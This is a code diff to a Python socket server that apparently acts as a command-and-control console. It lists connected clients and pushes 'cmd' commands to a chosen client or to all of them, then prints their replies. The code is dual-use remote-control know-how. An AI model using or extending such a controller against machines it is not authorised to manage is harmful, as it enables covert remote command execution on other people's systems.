@@ -67,6 +67,16 @@ def ThreadStartServer():
 
         s.close()
 
+def SendCommandToClient(client, command):
+    client.connection.send(command.encode())
+
+    while True:
+        data = client.connection.recv(256).decode()
+        if data == "DONE":
+            break;
+        else:
+            print("Received: " + data);
+
 threading.Thread(target=ThreadStartServer).start()
 
 time.sleep(1)
@@ -78,6 +88,7 @@ print("""Available commands:
 
 while True:
     command = input(">> ")
+    
     if command == "list":
         if len(clients) > 0:
             i = 0
@@ -85,20 +96,26 @@ while True:
                 print("Client " + str(i) + ": " + c.info + "\n")
         else:
             print("No available clients.\n")
+            
     elif command.startswith("cmd"):
         commandSplitted = command.strip().split(" ")
         if len(commandSplitted) > 1:
-            client = clients[0]
-            client.connection.send(command.encode())
+            
+            if commandSplitted[1] == "all":
+                for client in clients:
+                    SendCommandToClient(client, command)
+            else:
+                try:
+                    clientNumber = int(commandSplitted[1])
 
-            while True:
-                data = client.connection.recv(256).decode()
-                if data == "DONE":
-                    break;
-                else:
-                    print("Received: " + data);
+                    client = clients[clientNumber]
+                    SendCommandToClient(client, command)
+
+                except ValueError as e:
+                    print("[ERROR] " + str(e))
         else:
             print("[ERROR] cmd: No arguments specified.")
+            
     elif command.startswith("shutdown"):
         commandSplitted = command.strip().split(" ")
         if len(commandSplitted) > 1:
